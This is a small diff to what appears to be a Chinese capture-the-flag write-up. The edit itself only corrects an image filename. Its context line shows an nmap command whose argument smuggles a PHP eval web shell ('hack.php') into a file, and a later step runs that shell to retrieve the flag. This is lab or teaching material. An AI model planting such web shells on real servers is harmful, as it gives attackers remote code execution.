@@ -112,7 +112,8 @@ nmap -T5 -sT -Pn --host-timeout 2 -F '\<\?php @eval\(\$_POST\[\"hack\"\]\)\;\?\>
 ![](./img/目录构建成功.png)       
 
 11. 执行`60c11ec7d871344ad92fb3f119387254/hack.php`     
-![](./img/onlinetool获取到flag)    
+
+![](./img/onlinetool获取到flag.png)    
 
 ## 参考资料
 
